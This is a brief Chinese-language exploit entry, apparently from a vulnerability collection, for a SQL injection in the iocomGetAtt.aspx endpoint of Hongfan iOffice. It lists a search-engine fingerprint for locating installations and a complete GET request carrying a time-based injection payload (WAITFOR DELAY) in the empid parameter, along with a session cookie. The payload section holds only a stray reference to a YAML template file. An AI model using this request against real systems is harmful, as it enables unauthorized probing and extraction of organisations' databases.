# 红帆iOfficeiocomGetAtt存在SQL注入漏洞

- **系统**：红帆　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="红帆 iOffice"`
- **请求**：`GET /ioffice/prg/interface/iocomGetAtt.aspx?NewPdf=1&empid=1;WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=ahhuozybbvs4srud0ezfh545`

**请求体 / payload**
```

\[红帆-ioffice-iocomgetatt-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 红帆iOffice iocomGetAtt存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 红帆iOffice